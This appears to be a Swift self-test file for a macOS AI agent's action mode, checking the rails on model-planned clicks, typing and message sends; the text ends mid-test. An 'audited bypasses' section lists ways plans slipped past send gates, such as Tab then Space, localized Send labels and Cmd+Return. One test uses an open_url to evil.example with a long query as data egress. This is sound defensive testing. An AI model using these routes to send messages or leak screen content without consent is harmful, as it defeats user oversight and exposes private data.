import AppKit
import ApplicationServices
import Foundation

/// Scripted stand-in for the machine, so the executor's safety logic can be
/// exercised without touching real apps.
final class FakeActionHost: ActionHost {
    /// Frontmost app after each `openApp`, keyed by the requested name.
    var appsByName: [String: (name: String, bundleID: String)] = [:]
    var frontmost: (name: String, bundleID: String)?
    var windowTitle: String?
    var elementLabel: String?
    /// The highlighted row of a quick switcher, as the app labels it.
    var selectionLabel: String?
    var focusedRole: String?
    var visibleNamesValue: [String] = []
    /// Labels that `pressElement` can find on the fake screen.
    var pressableLabels: Set<String> = []
    var canPostInput = true
    var screenIsLocked = false
    /// Whether anything on screen can receive typed characters.
    var hasTextTarget = true
    var typingSucceeds = true
    var keyPressSucceeds = true
    var openURLSucceeds = true
    /// Set to make `frontmostApp()` change after N reads (focus stolen).
    var frontmostAfterReads: (reads: Int, value: (name: String, bundleID: String)?)?

    /// Fires after each host call, so a test can change the world mid-plan.
    var onStep: ((String) -> Void)?

    private(set) var log: [String] = []
    private(set) var typed: [String] = []
    private(set) var keys: [(CGKeyCode, CGEventFlags)] = []
    private(set) var openedURLs: [URL] = []
    private(set) var pressedLabels: [String] = []
    private var frontmostReads = 0
    private var clock: TimeInterval = 0

    func openApp(named name: String) -> String? {
        log.append("openApp(\(name))")
        guard let resolved = appsByName[name] else { return nil }
        frontmost = resolved
        return resolved.name
    }

    func openURL(_ url: URL) -> Bool {
        log.append("openURL(\(url.absoluteString))")
        openedURLs.append(url)
        return openURLSucceeds
    }

    func frontmostApp() -> (name: String, bundleID: String)? {
        frontmostReads += 1
        if let scheduled = frontmostAfterReads, frontmostReads > scheduled.reads {
            return scheduled.value
        }
        return frontmost
    }

    func frontmostWindowTitle() -> String? { windowTitle }
    func focusedElementLabel() -> String? { elementLabel }
    func focusedSelectionLabel() -> String? { selectionLabel }
    func focusedElementRole() -> String? { focusedRole }
    func visibleNames() -> [String] { visibleNamesValue }
    var hasFocusedTextTarget: Bool { hasTextTarget }

    func typeText(_ text: String, expecting bundleID: String?) -> Bool {
        log.append("type(\(text))")
        typed.append(text)
        onStep?("type(\(text))")
        return typingSucceeds
    }

    func pasteText(_ text: String, expecting bundleID: String?) -> Bool {
        typeText(text, expecting: bundleID)
    }

    func pressKey(_ keyCode: CGKeyCode, flags: CGEventFlags,
                  expecting bundleID: String?) -> Bool {
        log.append("key(\(keyCode))")
        keys.append((keyCode, flags))
        return keyPressSucceeds
    }

    func pressElement(label: String, expecting bundleID: String?) -> Bool {
        log.append("press(\(label))")
        guard pressableLabels.contains(label) else { return false }
        pressedLabels.append(label)
        onStep?("press(\(label))")
        return true
    }

    func sleep(ms: Int) { clock += Double(ms) / 1000 }
    func now() -> TimeInterval { clock }
}

/// Scripted stand-in for the engine's turn planner, so the loop driver can be
/// exercised without a model or a socket.
final class FakeTurnPlanner: ActionTurnPlanner {
    private var turns: [PlannedTurn]
    private(set) var startCount = 0
    private(set) var observations: [[String: Any]] = []
    private(set) var ended = false
    /// Fires on each observe BEFORE the next turn is returned, so a test can
    /// change the fake screen the way a real press changes a real one.
    var onObserve: (([String: Any]) -> Void)?

    init(turns: [PlannedTurn]) {
        self.turns = turns
    }

    private func next() -> PlannedTurn {
        turns.isEmpty ? .failure(reason: "planner script exhausted", code: "failed")
                      : turns.removeFirst()
    }

    func start(transcript: String, context: ActionContextSnapshot) -> PlannedTurn {
        startCount += 1
        return next()
    }

    func observe(_ observation: [String: Any]) -> PlannedTurn {
        observations.append(observation)
        onObserve?(observation)
        return next()
    }

    func end() { ended = true }
}

final class FakeAgentActionCore: AgentActionCoordinating {
    private(set) var isRunning = false
    private(set) var isExecuting = false
    private(set) var performCount = 0
    private(set) var cancelCount = 0
    private(set) var handledEvents = 0
    private(set) var activeActionID: String? = "engine-task"
    private var completion: ((ActionResult) -> Void)?

    func perform(
        transcript: String,
        context: ActionContextSnapshot,
        execute: Bool,
        allowSend: Bool,
        completion: @escaping (ActionResult) -> Void
    ) {
        performCount += 1
        isRunning = true
        isExecuting = execute
        self.completion = completion
    }

    func cancel() { cancelCount += 1 }
    func handle(_ event: EngineEvent) { handledEvents += 1 }

    func complete(_ result: ActionResult) {
        isRunning = false
        isExecuting = false
        activeActionID = nil
        let callback = completion
        completion = nil
        callback?(result)
    }
}

extension Selftest {

    // MARK: - Suite entry point

    static func testActionMode() {
        // Guard the shared fixtures FIRST. Each rail below does
        // `guard let plan = decodePlan(...) else { expect(false); return }`, so
        // one stale fixture used to turn ~25 executor assertions dark while the
        // report showed a handful of failures — the worst shape a safety suite
        // can take. If the fixtures stop decoding, say so once, loudly.
        expect(decodePlan(slackPlanJSON)?.steps.count == 11,
               "FIXTURE: the Slack plan decodes to 11 steps — the executor rails "
                   + "below are skipped if it does not")
        expect(decodePlan(slackDraftPlanJSON)?.steps.count == 9,
               "FIXTURE: the draft plan decodes to 9 steps")
        testActionPlanDecoding()
        testActionPlanRejectsUnsafePlans()
        testPressElementDecoding()
        testAuditedBypasses()
        testBatchStateCarriesAcrossTurns()
        testSendGateHardening()
        testActionKeyVocabulary()
        testAppMatching()
        testActionExecutorHappyPath()
        testActionExecutorSafetyRails()
        testActionExecutorPressElement()
        testActionLoopRecovery()
        testActionLoopSafetyRails()
        testAgentTaskLedger()
        testAgentSessionManagerKeepsTheCoreBoundary()
        testSecondaryHotkeyRouting()
        testActionShortcutSettingsMigration()
        testStreamDraftRevisionPolicy()
        testActionCLIParsing()
    }

    private static func testAgentTaskLedger() {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("velora-agent-ledger-\(UUID().uuidString)",
                                    isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let url = root.appendingPathComponent("agent.sqlite3")
        var interruptedID = ""
        do {
            let store = AgentTaskStore(url: url, retentionDays: 14, maximumTasks: 2)
            var context = ActionContextSnapshot()
            context.frontmostApp = "Slack"
            context.frontmostBundle = "com.tinyspeck.slackmacgap"
            context.frontmostWindow = "Himesh"
            let started = store.begin(
                command: "draft hello to Himesh",
                context: context,
                execute: true,
                allowSend: true)
            guard case .success(let taskID) = started else {
                expect(false, "the local agent ledger starts a durable task")
                return
            }
            interruptedID = taskID
            store.recordTurn(
                taskID: interruptedID,
                turn: 1,
                sends: false,
                goal: "draft hello",
                stepCount: 3,
                durationMs: 42)
            store.flush()
            expect(store.recent().first?.status == .running,
                   "the local agent ledger records a live task")
            expect(store.events(taskID: interruptedID).map(\.kind)
                    == ["started", "planner_turn"],
                   "the ledger appends compact lifecycle events in order")
            let attributes = try? FileManager.default.attributesOfItem(atPath: url.path)
            let permissions = (attributes?[.posixPermissions] as? NSNumber)?.intValue
            expect(permissions == 0o600, "the agent ledger is owner-only")
        }

        do {
            let recovered = AgentTaskStore(url: url, retentionDays: 14, maximumTasks: 2)
            expect(recovered.recent().first(where: { $0.id == interruptedID })?.status
                    == .interrupted,
                   "a task abandoned by a terminated app is marked interrupted")

            var context = ActionContextSnapshot()
            context.frontmostApp = "Finder"
            for index in 0..<3 {
                let started = recovered.begin(
                    command: "task \(index)", context: context,
                    execute: false, allowSend: false)
                guard case .success(let id) = started else {
                    expect(false, "the recovered ledger accepts task \(index)")
                    continue
                }
                recovered.finish(
                    taskID: id,
                    result: .completed(goal: "task \(index)", trace: ["receipt \(index)"]),
                    durationMs: index)
                recovered.flush()
            }
            expect(recovered.recent(limit: 10).count == 2,
                   "the agent ledger enforces its task-count memory bound")
        }
    }

    private static func testAgentSessionManagerKeepsTheCoreBoundary() {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("velora-agent-manager-\(UUID().uuidString)",
                                    isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let store = AgentTaskStore(
            url: root.appendingPathComponent("agent.sqlite3"),
            retentionDays: 14,
            maximumTasks: 10)
        let core = FakeAgentActionCore()
        let manager = AgentSessionManager(core: core, store: store)
        var completed = false
        manager.perform(
            transcript: "open Slack",
            context: ActionContextSnapshot(),
            execute: true,
            allowSend: true
        ) { result in
            if case .completed = result { completed = true }
        }
        expect(core.performCount == 1 && manager.isRunning,
               "the agent lifecycle delegates execution to the existing core")
        var overlapRefused = false
        manager.perform(
            transcript: "open Mail",
            context: ActionContextSnapshot()
        ) { result in
            if case .failed = result { overlapRefused = true }
        }
        expect(overlapRefused && core.performCount == 1,
               "the agent lifecycle refuses an overlapping task")

        manager.handle(.actionTurn(
            id: "stale-engine-task", turn: 9, sends: true, goal: "stale",
            steps: [], done: true, ms: 999))
        manager.handle(.actionTurn(
            id: "engine-task", turn: 1, sends: false, goal: "open Slack",
            steps: [["do": "open_app", "app": "Slack"]], done: true, ms: 17))
        manager.cancel()
        expect(core.handledEvents == 2 && core.cancelCount == 1,
               "events and cancellation still cross the single core boundary")
        core.complete(.completed(goal: "open Slack", trace: ["open_app Slack"]))
        expect(waitUntil { completed },
               "completion waits for the durable receipt commit")

        let row = store.recent().first
        expect(completed && row?.status == .completed && row?.goal == "open Slack",
               "the separate lifecycle persists the core's verified outcome")
        let eventKinds = row.map { store.events(taskID: $0.id).map(\.kind) } ?? []
        expect(eventKinds.contains("planner_turn")
                && eventKinds.contains("cancel_requested")
                && eventKinds.contains("receipt"),
               "the durable ledger records planner, cancellation, and receipts")
        let turns = row.map {
            store.events(taskID: $0.id).filter { $0.kind == "planner_turn" }
        } ?? []
        expect(turns.count == 1 && turns.first?.turn == 1,
               "the ledger ignores stale turns the core would reject")

        let unavailableRoot = FileManager.default.temporaryDirectory
            .appendingPathComponent("velora-agent-unavailable-\(UUID().uuidString)",
                                    isDirectory: true)
        try? FileManager.default.createDirectory(
            at: unavailableRoot, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: unavailableRoot) }
        let blockedCore = FakeAgentActionCore()
        let unavailable = AgentTaskStore(url: unavailableRoot)
        let blocked = AgentSessionManager(core: blockedCore, store: unavailable)
        var unavailableReason = ""
        blocked.perform(
            transcript: "open Calendar",
            context: ActionContextSnapshot()
        ) { result in
            if case .failed(let reason, _) = result { unavailableReason = reason }
        }
        expect(blockedCore.performCount == 0 && unavailableReason.contains("ledger"),
               "a privileged action cannot start without its durable ledger")
    }

    // MARK: - audited bypasses (2026-08-04)

    /// Every plan here was ACCEPTED by the shipped 0.14.1 validator. The
    /// engine has the same rails; these exist because the app is the half
    /// holding the Accessibility grant, and because the last round showed
    /// that mirroring a contract faithfully also mirrors its holes.
    private static func testAuditedBypasses() {
        // --- localized committing labels. macOS ships localized, so an
        // English-only denylist meant this gate did not exist at all on a
        // French or Spanish Mac.
        for label in ["Envoyer", "Supprimer", "Répondre", "Enviar",
                      "Löschen", "Bestätigen", "Verzenden", "Excluir",
                      "发送邮件", "메시지 삭제", "Отправить сообщение"] {
            expect(decodePlanError("""
            {"steps":[{"do":"wait_frontmost","app":"Mail"},
              {"do":"press_element","label":"\(label)"}]}
            """) == .committingPressLabel(label),
            "'\(label)' names a committing control in its own language")
        }
        // ...and the localized list must not cost false refusals.
        for label in ["Priya Sharma", "Sendhil Ramesh", "Marketing Updates"] {
            expect(decodePlan("""
            {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
              {"do":"press_element","label":"\(label)"}]}
            """) != nil, "'\(label)' is an ordinary row and still presses")
        }

        // --- Space activates the focused control. type → tab → space
        // delivered a message past the press denylist, the verify gate, and
        // the draft lock at once.
        expect(decodePlanError("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"secret"},
          {"do":"key","key":"tab"},{"do":"key","key":"space"}]}
        """) == .sendInDraft(step: 3),
        "a draft cannot deliver by tabbing to the button and pressing Space")

        expect(decodePlanError("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},{"do":"key","key":"space"}]}
        """) == .unverifiedSend(step: 2),
        "an unverified Space cannot deliver typed text in a send either")

        expect(decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"tab"},{"do":"key","key":"space"}]}
        """) != nil,
        "Space with nothing typed is navigation and stays ungated")

        // --- Tab moves focus, so a verify before it no longer describes
        // where a Return lands.
        expect(decodePlanError("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"key","key":"tab"},{"do":"key","key":"return"}]}
        """) == .unverifiedSend(step: 4),
        "Tab after the verify re-arms the send gate")

        expect(decodePlan("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},{"do":"key","key":"tab"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"key","key":"return"}]}
        """) != nil, "verifying after the last Tab still sends")

        // Space must not clear pending text: clearing on the "it typed a
        // space" reading would leave the text pending but ungated.
        var spaceState = ActionPlan.BatchState()
        expect(decodeBatch("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"key","key":"space"}]}
        """, state: &spaceState) != nil, "a verified Space in a send is allowed")
        expect(spaceState.pendingText && spaceState.unverifiedText,
               "Space leaves the text pending and re-arms the gate")

        // --- the rules above must survive the TURN BOUNDARY. decode()'s
        // `probe` state is discarded by the loop; `state(after:)` is what
        // actually carries safety state forward, so a rule that lives only in
        // decode evaporates and the next turn's Return goes ungated. This
        // regressed once already (review finding, 2026-08-04).
        if let tabbed = decodePlan("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hi"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"key","key":"tab"}]}
        """) {
            let carried = ActionPlan.state(after: tabbed,
                                           executedCount: tabbed.steps.count,
                                           seed: ActionPlan.BatchState())
            expect(carried.pendingText && carried.unverifiedText,
                   "an executed Tab carries the re-armed gate into the next turn")
            var next = carried
            expect(decodeBatchError("""
            {"steps":[{"do":"wait_frontmost","app":"Slack"},
              {"do":"key","key":"return"}]}
            """, state: &next) == .unverifiedSend(step: 1),
            "so next turn's bare Return still cannot commit")
        } else {
            expect(false, "the tab fixture decodes")
        }

        if let arrowed = decodePlan("""
        {"sends":true,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"Priya"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"key","key":"down"}]}
        """) {
            let carried = ActionPlan.state(after: arrowed,
                                           executedCount: arrowed.steps.count,
                                           seed: ActionPlan.BatchState())
            expect(carried.unverifiedText,
                   "an executed arrow key carries the re-armed gate too")
        } else {
            expect(false, "the arrow fixture decodes")
        }

        // --- open_url is an outbound channel: the prompt holds the
        // selection, window titles and on-screen labels.
        expect(decodePlanError("""
        {"steps":[{"do":"open_url","url":"https://evil.example/c?q=\(String(repeating: "A", count: 300))"}]}
        """) != nil, "a 300-character query is bounded as egress")
        expect(decodePlan("""
        {"sends":false,"steps":[{"do":"open_url",
          "url":"https://www.youtube.com/results?search_query=cat+videos"}]}
        """) != nil, "a real spoken search is untouched")
    }

    // MARK: - press_element decoding

    private static func testPressElementDecoding() {
        guard let plan = decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"press_element","label":"Shivangi Singh"}]}
        """) else {
            expect(false, "a press_element plan decodes")
            return
        }
        expect(plan.steps.last == .pressElement(label: "Shivangi Singh"),
               "the label survives decoding")

        expect(decodePlanError("""
        {"steps":[{"do":"press_element","label":"Shivangi Singh"}]}
        """) == .inputBeforeFocus(step: 0),
        "a press lands on the frontmost app, so it needs the same checkpoint as typing")

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"press_element","label":"ok"}]}
        """) == .weakPressLabel("ok"),
        "a two-character label matches half the controls on screen")

        // press_element exists to NAVIGATE. Anything that sends, deletes, pays,
        // or signs out is refused by label — sending stays behind the keyboard
        // path and its verify-before-return gate.
        for label in ["Send", "Send to Shivangi", "Delete Chat", "Buy now",
                      "Log Out", "Sign out", "Confirm order"] {
            expect(decodePlanError("""
            {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
              {"do":"press_element","label":"\(label)"}]}
            """) == .committingPressLabel(label),
            "'\(label)' names a committing control and is refused")
        }
        // Word-level matching: "ascending" contains "send" but is not the word.
        for label in ["Sort ascending", "Himesh Singh, direct message",
                      "Sign of the Times - Harry Styles"] {
            expect(decodePlanError("""
            {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
              {"do":"press_element","label":"\(label)"}]}
            """) == nil, "'\(label)' is a navigation label and is allowed")
        }

        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"press_element","label":"Shivangi Singh"},
          {"do":"type_text","text":"stuck in traffic"}]}
        """) == .inputBeforeFocus(step: 2),
        "a press changes what is on screen — typing after it needs a fresh checkpoint")
    }

    // MARK: - Carried state across turns

    private static func testBatchStateCarriesAcrossTurns() {
        // Text typed in turn N must not become committable in turn N+1 just
        // because the new batch starts with a clean flag.
        var state = ActionPlan.BatchState()
        expect(decodeBatch("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hello there"}]}
        """, state: &state) != nil, "turn one types after its checkpoint")
        expect(state.unverifiedText, "the typed text is remembered as unverified")
        expect(decodeBatchError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},{"do":"key","key":"return"}]}
        """, state: &state) == .unverifiedSend(step: 1),
        "a bare Return in the NEXT turn cannot commit last turn's text")
        expect(decodeBatch("""
        {"steps":[{"do":"verify_context","expect":["Himesh"]},
          {"do":"key","key":"return"}]}
        """, state: &state) != nil,
        "verifying first makes the same Return acceptable (in a sending action)")

        // The text budget is for the whole action, not per turn.
        var textState = ActionPlan.BatchState()
        let big = String(repeating: "x", count: 1_900)
        for _ in 0..<2 {
            _ = decodeBatch("""
            {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
              {"do":"type_text","text":"\(big)"}]}
            """, state: &textState)
        }
        expect(decodeBatchError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"\(String(repeating: "y", count: 300))"}]}
        """, state: &textState) != nil,
        "the total text budget spans every turn of the action")

        // So is the step budget.
        var stepState = ActionPlan.BatchState()
        let batch = """
        {"sends":false,"steps":[\((0..<10).map { _ in
            "{\"do\":\"wait_frontmost\",\"app\":\"Slack\"}" }.joined(separator: ","))]}
        """
        _ = decodeBatch(batch, state: &stepState)
        _ = decodeBatch(batch, state: &stepState)
        expect(decodeBatchError(batch, state: &stepState) != nil,
               "24 steps is the budget for the action, not for one turn")

        // A rejected batch must not consume budget: the repair attempt starts
        // from the same place.
        var cleanState = ActionPlan.BatchState()
        _ = decodeBatchError("""
        {"steps":[{"do":"type_text","text":"hi"}]}
        """, state: &cleanState)
        expect(cleanState == ActionPlan.BatchState(),
               "a rejected batch leaves the carried state untouched")
    }

    // MARK: - Send-gate hardening (adversarial review round 2)

    private static func testSendGateHardening() {
        // ⌘Return is Send in Gmail/Slack/GitHub/Linear — it must be as
        // committing as bare Return, not a free pass.
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"hello"},
          {"do":"key","key":"return","mods":["cmd"]}]}
        """) == .unverifiedSend(step: 2),
        "a modified Return is still a send and still needs the verify")

        // ⌘V pastes and bare printable keys type: both arm the gate.
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"v","mods":["cmd"]},
          {"do":"key","key":"return"}]}
        """) == .unverifiedSend(step: 2),
        "pasted clipboard contents cannot be committed unverified")
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"key","key":"h"},
          {"do":"key","key":"return"}]}
        """) == .unverifiedSend(step: 2),
        "characters typed via bare key steps cannot be committed unverified")

        // A draft refuses committing keys outright once text is pending —
        // even verified. Navigation goes through press_element.
        expect(decodePlanError("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"type_text","text":"Himesh"},
          {"do":"verify_context","expect":["Himesh"]},
          {"do":"key","key":"return"}]}
        """) == .sendInDraft(step: 3),
        "a draft never commits typed text, verified or not")

        // Navigation between the verify and the Return re-arms the gate: the
        // check described a screen the press/open just replaced.
        var state = ActionPlan.BatchState()
        expect(decodeBatch("""
        {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"type_text","text":"running late"},
          {"do":"verify_context","expect":["Priya"]},
          {"do":"press_element","label":"Priya Sharma"}]}
        """, state: &state) != nil, "the navigation batch itself is fine")
        expect(decodeBatchError("""
        {"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"key","key":"return"}]}
        """, state: &state) == .unverifiedSend(step: 1),
        "after a press, pending text must be re-verified before any Return")

        // One validated Return must not become twelve at execution time.
        expect(decodePlanError("""
        {"steps":[{"do":"wait_frontmost","app":"Slack"},
          {"do":"verify_context","expect":["Himesh"]},
          {"do":"key","key":"return","repeat":3}]}
        """) == .committingKeyRepeats(step: 2),
        "committing keys never repeat")
    }

    // MARK: - Executor: press_element

    private static func testActionExecutorPressElement() {
        let host = FakeActionHost()
        host.frontmost = ("WhatsApp", "net.whatsapp.WhatsApp")
        host.pressableLabels = ["Shivangi Singh"]
        guard let plan = decodePlan("""
        {"sends":false,"steps":[{"do":"wait_frontmost","app":"WhatsApp"},
          {"do":"press_element","label":"Shivangi Singh"}]}
        """) else {
            expect(false, "the press plan decodes")
            return
        }
        let result = ActionExecutor(host: host).run(plan)
        expect(result.outcome == .completed, "a findable label is pressed")
        expect(host.pressedLabels == ["Shivangi Singh"], "the press reaches the host")

        // The label isn't on screen → recoverable: the model should look again
        // and try something else, not the user.
        let missing = FakeActionHost()
        missing.frontmost = ("WhatsApp", "net.whatsapp.WhatsApp")
        if case .failed(_, _, let recoverable) = ActionExecutor(host: missing)
            .run(plan).outcome {
            expect(recoverable, "an unfindable label is a recoverable failure")
        } else {
            expect(false, "an unfindable label must fail the step")
        }
    }

    // MARK: - The loop: observe → decide → act

    private static func jsonSteps(_ text: String) -> [Any] {
        (try? JSONSerialization.jsonObject(with: Data(text.utf8))) as? [Any] ?? []
    }

    private static func loopContext() -> ActionContextSnapshot {
        var snapshot = ActionContextSnapshot()
        snapshot.frontmostApp = "Sublime Text"
        snapshot.runningApps = ["WhatsApp", "Slack", "Sublime Text"]
        return snapshot
    }

    /// The exact failure from the field, replayed: WhatsApp's Return does not
    /// open a chat, so the verify fails — and instead of giving up with a
    /// "Retry" toast, the loop reports what it saw and the next turn presses
    /// the person's row directly.
    private static func testActionLoopRecovery() {
        let host = FakeActionHost()
        host.appsByName["WhatsApp"] = ("WhatsApp", "net.whatsapp.WhatsApp")
        host.windowTitle = "WhatsApp"
        host.elementLabel = "Search"
        host.focusedRole = "AXTextField"
        host.visibleNamesValue = ["Shivangi Singh", "Himesh Singh"]
        host.pressableLabels = ["Shivangi Singh"]
        host.onStep = { step in
            if step == "press(Shivangi Singh)" {
                host.windowTitle = "Shivangi Singh"
                host.elementLabel = "Message to Shivangi Singh"
            }
        }
        let planner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "draft to Shivangi", steps: jsonSteps("""
            [{"do":"open_app","app":"WhatsApp"},
             {"do":"wait_frontmost","app":"WhatsApp"},
             {"do":"key","key":"f","mods":["cmd"]},
             {"do":"type_text","text":"Shivangi"},
             {"do":"verify_context","expect":["Shivangi"]}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"WhatsApp"},
             {"do":"press_element","label":"Shivangi Singh"}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"verify_context","expect":["Shivangi"]},
             {"do":"type_text","text":"stuck in traffic"}]
            """), done: true),
        ])
        let runner = ActionLoopRunner(host: host, planner: planner,
                                      execute: true, allowSend: false)
        let result = runner.run(transcript: "message Shivangi about traffic",
                                context: loopContext())
        guard case .completed(_, let trace) = result else {
            expect(false, "the loop recovers and completes, got \(result)")
            return
        }
        expect(host.pressedLabels == ["Shivangi Singh"],
               "the recovery pressed the person's row")
        expect(host.typed.contains("stuck in traffic"),
               "the message was typed after the recovery verified the chat")
        expect(trace.contains { $0.contains("press_element") },
               "the trace shows the press")
        expect(planner.observations.count == 2, "each turn saw a fresh observation")
        let first = planner.observations[0]
        expect((first["failed_step"] as? String)?.contains("Shivangi") == true,
               "the failed verify is reported to the model verbatim")
        expect((first["screen_names"] as? [String])?.contains("Shivangi Singh") == true,
               "the observation offers the labels the screen actually shows")
        expect((first["executed"] as? [String])?.isEmpty == false,
               "the observation carries what already ran")
        expect(planner.ended, "the session is closed when the loop finishes")
    }

    private static func testActionLoopSafetyRails() {
        // 1. The runtime-truth rail. Turn 1 types and its verify FAILS at
        //    runtime — decode-time state says "verified", the machine says no.
        //    A bare Return next turn must be rejected, or the loop reintroduces
        //    the wrong-recipient send the one-shot design already fixed.
        let host = FakeActionHost()
        host.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        host.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        host.windowTitle = "general (Channel) - Slack"
        host.elementLabel = "Query"
        let planner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "g", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"},
             {"do":"type_text","text":"hello"},
             {"do":"verify_context","expect":["Himesh"]}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"},
             {"do":"key","key":"return"}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"verify_context","expect":["Himesh"]}]
            """), done: false),
        ])
        let runner = ActionLoopRunner(host: host, planner: planner,
                                      execute: true, allowSend: false)
        let result = runner.run(transcript: "t", context: loopContext())
        expect(host.keys.isEmpty,
               "text whose verify failed at RUNTIME is never committed by a later turn")
        expect(planner.observations.count >= 2
               && (planner.observations[1]["failed_step"] as? String)?
                   .contains("rejected") == true,
               "the rejected batch is reported to the model as an observation")
        if case .completed = result {
            expect(false, "a loop that never met its goal must not claim success")
        }

        // 2. sends=true from the first turn + a caller that never consented →
        //    refused before anything runs.
        let sendHost = FakeActionHost()
        let sendPlanner = FakeTurnPlanner(turns: [
            .turn(sends: true, goal: "message Priya", steps: jsonSteps("""
            [{"do":"open_app","app":"Slack"}]
            """), done: false),
        ])
        let sendRunner = ActionLoopRunner(host: sendHost, planner: sendPlanner,
                                          execute: true, allowSend: false)
        let sendResult = sendRunner.run(transcript: "t", context: loopContext())
        if case .needsSendApproval = sendResult {
            expect(sendHost.log.isEmpty, "nothing executes without send consent")
            expect(sendPlanner.ended, "the refused session is closed")
        } else {
            expect(false, "a sending action without consent is refused, got \(sendResult)")
        }

        // 3. A model that never says done runs out of turns, not forever.
        let capHost = FakeActionHost()
        capHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        capHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        let endless = PlannedTurn.turn(sends: false, goal: "g", steps: jsonSteps("""
        [{"do":"wait_frontmost","app":"Slack"}]
        """), done: false)
        let capPlanner = FakeTurnPlanner(
            turns: Array(repeating: endless, count: ActionLoopRunner.maxTurns + 4))
        let capRunner = ActionLoopRunner(host: capHost, planner: capPlanner,
                                        execute: true, allowSend: false)
        if case .failed(let reason, _) = capRunner.run(transcript: "t",
                                                       context: loopContext()) {
            expect(reason.lowercased().contains("attempt"),
                   "running out of turns says so plainly")
        } else {
            expect(false, "an endless loop must fail at the turn cap")
        }
        expect(capPlanner.observations.count == ActionLoopRunner.maxTurns - 1,
               "the loop stops asking after the cap")

        // 4. A fatal failure ends the loop immediately — no more turns.
        let fatalHost = FakeActionHost()
        fatalHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        fatalHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        fatalHost.windowTitle = "Himesh Singh (DM) - Slack"
        fatalHost.canPostInput = false
        let fatalPlanner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "g", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"},{"do":"type_text","text":"hi"}]
            """), done: false),
            .turn(sends: false, goal: "", steps: jsonSteps("""
            [{"do":"wait_frontmost","app":"Slack"}]
            """), done: false),
        ])
        let fatalRunner = ActionLoopRunner(host: fatalHost, planner: fatalPlanner,
                                           execute: true, allowSend: false)
        if case .failed = fatalRunner.run(transcript: "t", context: loopContext()) {
            expect(fatalPlanner.observations.isEmpty,
                   "secure input is not something another turn can fix")
        } else {
            expect(false, "blocked input must fail the loop")
        }

        // 5. Dry run: the first batch comes back described, nothing executes.
        let dryHost = FakeActionHost()
        let dryPlanner = FakeTurnPlanner(turns: [
            .turn(sends: false, goal: "open Slack", steps: jsonSteps("""
            [{"do":"open_app","app":"Slack"}]
            """), done: false),
        ])
        let dryRunner = ActionLoopRunner(host: dryHost, planner: dryPlanner,
                                         execute: false, allowSend: false)
        if case .planned(let plan) = dryRunner.run(transcript: "t",
                                                   context: loopContext()) {
            expect(plan.steps.first == .openApp("Slack"), "the dry run shows the batch")
            expect(dryHost.log.isEmpty, "a dry run never touches the machine")
            expect(dryPlanner.ended, "a dry run closes the session")
        } else {
            expect(false, "a dry run reports the planned batch")
        }

        // 6. Cancel mid-batch stops the loop, not just the batch.
        let cancelHost = FakeActionHost()
        cancelHost.appsByName["Slack"] = ("Slack", "com.tinyspeck.slackmacgap")
        cancelHost.frontmost = ("Slack", "com.tinyspeck.slackmacgap")
        cancelHost.windowTitle = "Himesh Singh (DM) - Slack"
